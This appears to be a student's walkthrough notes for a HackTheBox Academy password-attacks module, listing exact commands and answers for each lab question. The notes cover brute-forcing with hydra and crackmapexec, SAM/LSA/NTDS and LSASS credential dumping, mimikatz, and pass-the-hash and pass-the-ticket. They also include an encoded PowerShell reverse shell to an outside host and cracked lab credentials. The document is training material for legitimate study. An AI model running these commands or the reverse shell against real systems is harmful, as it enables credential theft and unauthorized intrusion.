# Remote Password Attacks

Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash

crackmapexec smb 10.129.202.136 -u username.list -p password.list --users

crackmapexec winrm 10.129.202.136 -u john -p november -x 'type C:\Users\john\Desktop\flag.txt'


```

Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. 

```bash

hydra -L username.list -P password.list ssh://10.129.202.136 

# login: dennis   password: rockstar

ssh dennis@10.129.202.136  

```

Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. 

```bash
hydra -L username.list -P password.list rdp://10.129.202.136 

#  login: chris   password: 789456123

```

Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. 

```bash
use scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts ip

# '.\cassie:12345678910'
crackmapexec smb 10.129.202.136 -u "cassie" -p "12345678910" --shares

smbclient \\\\10.129.202.136\\CASSIE -U cassie

```

# Password Mutations

Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer. 


```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

hydra -l sam -P mut_password.list ftp://10.129.202.64 -t 48

#login: sam   password: B@tm@n2022!


```

# Password Reuse / Default Passwords

Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: <username>:<password>)

github - https://github.com/ihebski/DefaultCreds-cheat-sheet

```bash
Manual Installation

$ git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
$ pip3 install -r requirements.txt
$ cp creds /usr/bin/ && chmod +x /usr/bin/creds
$ creds search mysql

# | Product             |      username     | password |
# | mysql               |      superdba     |  admin   |

```

# Attacking SAM

Where is the SAM database located in the Windows registry? (Format: ****\***) 

```bash
hklm\sam
```

Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer. 

```bash
crackmapexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

# ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::

sudo hashcat -m 1000 hash_sam /usr/share/wordlists/rockyou.txt 

# c02478537b9727d391bc80011c2e2321:matrix 

```

Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive) 

```bash

crackmapexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

# frontdesk:Password123

```

# Attacking LSASS

What is the name of the executable file associated with the Local Security Authority Process? 

```bash
lsass.exe

```

Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive) 

```bash
# Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/avataris12/HackTheBox/Password_Attacks/Password_Mutations

move lsass.DMP \\10.10.16.51\CompData

pypykatz lsa minidump lsass.DMP

echo "31f87811133bc6aaa75a536e77f64314" > lsa_hash  

sudo hashcat -m 1000 lsa_hash /usr/share/wordlists/rockyou.txt 



```


# Attacking Active Directory & NTDS.dit

What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***) 

```
NTDS.dit
```

Submit the NT hash associated with the Administrator user from the example output in the section reading. 

```
64f12cddaa88057e06a81b54e73b949b
```

On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive) 

```bash 
git clone https://github.com/urbanadventurer/username-anarchy.git

echo "John Marston IT Director \n Carol Johnson Financial Controller \n Jennifer Stapleton Logistics Manager" > names.txt

./username-anarchy -i names.txt > usernames.txt

crackmapexec smb 10.129.202.85 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt

# jmarston:P@ssword!

crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds

echo "92fd67fd2f49d0e83744aa82363f021b" > hash_stapleton

sudo hashcat -m 1000 hash_stapleton /usr/share/wordlists/rockyou.txt 

```

Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive) 


```bash

crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds

echo "92fd67fd2f49d0e83744aa82363f021b" > hash_stapleton

sudo hashcat -m 1000 hash_stapleton /usr/share/wordlists/rockyou.txt 

# 92fd67fd2f49d0e83744aa82363f021b:Winter2008  

```


# Credential Hunting in Linux


```bash

echo "LoveYou1" > password.txt 

hashcat --force password.txt -r custom.rule --stdout | sort -u > mut_password1.list

hydra -l kira -P mut_password1.list ssh://10.129.202.64 -t 48

# login: kira   password: L0vey0u1!

git clone https://github.com/unode/firefox_decrypt.git

wget http://10.10.14.10:8000/firefox_decrypt.py

python3.9 firefox_decrypt.py

#TUqr7QfLTLhruhVbCP


```
# Passwd, Shadow & Opasswd

Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer. 

```bash

cd /home/will/.backups

# cp the two files

unshadow passwd.bak shadow.bak > unshadowed.hashes

hashcat -m 1800 -a 0 unshadowed.hashes ../mut_password.list  

```

# Pass the Hash (PtH)


Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt. 

```bash

evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453


reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

type C:\pth.txt


xfreerdp  /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

```

Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer. 

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp  /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

DisableRestrictedAdmin

```

Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account? 

```bash
cd C:\tools

.\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords

```
Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt. 

```bash

.\mimikatz.exe

privilege::debug

# 8846f7eaee8fb117ad06bdd830b7586c:password 

sekurlsa::pth /user:David /domain:DC01 /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

net use \\DC01\david

type \\DC01\david\david.txt

```

Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt. 

```bash

# 64f12cddaa88057e06a81b54e73b949b:Password1


sekurlsa::pth /user:julio /domain:inlanefreight.htb /rc4:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe


more \\DC01\julio\julio.txt

```

Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt. 

```bash

evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453


Import-Module .\Invoke-TheHash.psd1


Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
# reverse shell - https://www.revshells.com/
# ip 172.16.1.5 port 4444



# on the connection xfreerdp start the listening
xfreerdp  /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

nc.exe -lvnp 4444

cd C:\julio
type flag.txt

```

# Pass the Ticket (PtT) from Windows

Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect? 

```bash

mimikatz.exe

sekurlsa::tickets /export

dir *.kirbi

# c4b0e1b10c7ce2c4723b4e2407ef81a2
```

Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john 

Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt 


```bash

mimikatz.exe

sekurlsa::ekeys


Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

powershell

Enter-PSSession -ComputerName DC01


```

# Pass the Ticket (PtT) from Linux

Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory. 

```bash
ssh david@inlanefreight.htb@10.129.99.246 -D 2222

cat flag.txt

```

Which group can connect to LINUX01? 


```bash
realm list

  permitted-groups: Linux Admins

```

Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory. 

```bash

find / -name *keytab* -ls 2>/dev/null

git clone https://raw.githubusercontent.com/sosdave/KeyTabExtract/master/keytabextract.py

python3 keytabextract.py /opt/specialfiles/carlos.keytab 

echo "a738f92b3c08b424ec2d99589a9cce60" > hash_carlos

sudo hashcat -m 1000 hash_carlos /usr/share/wordlists/rockyou.txt 

su - carlos@inlanefreight.htb

cat flag.txt

```

Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory. 

```bash

crontab -l

find / -name *.kt 2>/dev/null

python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt

echo "7247e8d4387e76996ff3f18a34316fdd" > hash_svc_workstations
# Password4
sudo hashcat -m 1000 hash_svc_workstations /usr/share/wordlists/rockyou.txt 


```


Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response. 

```bash

sudo su

```


Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio. 

```bash

ls -la /tmp

cp /tmp/krb5cc_647401106_HBeADV .

export KRB5CCNAME=/root/krb5cc_647401106_HBeADV 

klist

smbclient //dc01/julio -k -c ls -no-pass

smbclient //dc01/julio -k -c "get julio.txt" -no-pass

```

Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_). 


```bash

wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh

./linikatz.sh 

cd linikatz.11756

kinit LINUX01$ -k -t /root/linikatz.11756/_etc_krb5.keytab.1142

smbclient //dc01/linux01 -k -c "ls"
smbclient //dc01/linux01 -k -c "get flag.txt"

```

# Protected Files
Use the cracked password of the user Kira and log in to the host and crack the "id_rsa" SSH key. Then, submit the password for the SSH key as the answer. 


```bash
echo "LoveYou1" > password.txt 

hashcat --force password.txt -r custom.rule --stdout | sort -u > mut_password1.list

hydra -l kira -P mut_password1.list ssh://10.129.155.191 -t 48 

# L0vey0u1!

grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

python3 -m http.server 8000

wget http://10.129.155.191:8000/id_rsa

ssh2john id_rsa > ssh.hash 

john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash 

# L0veme

```

# Protected Archives

Use the cracked password of the user Kira, log in to the host, and read the Notes.zip file containing the flag. Then, submit the flag as the answer. 

```bash

wget http://10.129.155.191:8000/Notes.zip 

zip2john Notes.zip > hash_zip 

john --wordlist=mut_password.list hash_zip 

# P@ssw0rd3!

```

# Password Attacks Lab - Easy

```bash

hydra -L username.list -P password.list ftp://10.129.239.157 -t 48 

# mike 7777777

ftp 10.129.239.157

get id_rsa

ssh2john id_rsa > ssh.hash 

john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

cat .bash_history 

# dgb6fzm0ynk@AME9pqu

```

# Password Attacks Lab - Medium

Examine the second target and submit the contents of flag.txt in /root/ as the answer. 

```bash
nmap -v -A 10.129.202.221

crackmapexec smb 10.129.202.221 -u username.list -p password.list --users

# john:123456

crackmapexec smb 10.129.202.221 -u "john" -p "123456" --shares

smbclient \\\\10.129.202.221\\SHAREDRIVE -U john

get Docs.zip 

zip2john Docs.zip > hash_zip 

john --wordlist=mut_password.list hash_zip 

# Destiny2022!

office2john Documentation.docx > doc_hash

john --wordlist=mut_password.list doc_hash 

# 987654321

# jason:C4mNKjAtL2dydsYa6

mysql -u jason -p

show databases;
use users
show tables;
Select * from creds;

#dennis:7AUgWWQEiMPdqx

wget wget http://10.129.202.221:8000/id_rsa

ssh2john id_rsa.1 > ssh.hash.1

john --wordlist=mut_password.list ssh.hash.1 

# P@ssw0rd12020!

chmod 400 id_rsa.1

ssh -i id_rsa.1 root@10.129.202.221

cat flag.txt


```

# Password Attacks Lab - Hard

Examine the third target and submit the contents of flag.txt in C:\Users\Administrator\Desktop\ as the answer.


```bash

# user Johanna

sort mut_password.list | uniq > unique_list.list

crackmapexec  rdp  10.129.202.222 -u "Johanna" -p unique_list.list 
# 1231234!


evil-winrm -i 10.129.202.222 -u johanna -p 1231234!

sudo impacket-smbserver -smb2support share /home/avataris12/HackTheBox/Password_Attacks/Password_Attacks_Lab_Easy

copy Logins.kdbx \\10.10.16.47\share\Login.kdbx


keepass2john Login.kdbx > hash_kdbx

john --wordlist=mut_password.list hash_kdbx 

# Logins:Qwerty7!

xfreerdp  /v:10.129.202.222 /u:Johanna 


# david:gRzX7YbeTcDG7

crackmapexec smb 10.129.202.222  -u david -p gRzX7YbeTcDG7 --shares

smbclient \\\\10.129.202.222\\david -U david

get Backup.vhd

bitlocker2john -i Backup.vhd > hash_vhd

john --wordlist=mut_password.list hash_vhd

#123456789!          
#123456789!       

sudo apt install qemu-utils 
sudo apt install cryptsetup
sudo apt install ntfs-3g-dev

sudo modprobe nbd

sudo qemu-nbd -c /dev/nbd1 /home/avataris12/HackTheBox/Password_Attacks/Password_Attacks_Lab_Easy/Backup.vhd

lsblk

sudo cryptsetup bitlkOpen /dev/nbd1p2 bitty    
#123456789!

sudo mkdir /mnt/bitDrive

sudo mount /dev/mapper/bitty /mnt/bitDrive

cd /mnt/bitDrive

cp SAM /home/avataris12/HackTheBox/Password_Attacks/Password_Attacks_Lab_Easy

cp SYSTEM /home/avataris12/HackTheBox/Password_Attacks/Password_Attacks_Lab_Easy

sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL

echo "e53d4d912d96874e83429886c7bf22a1" > admin_hash

hashcat -m 1000 -a 0 admin_hash  mut_password.list

# Liverp00l8!


```


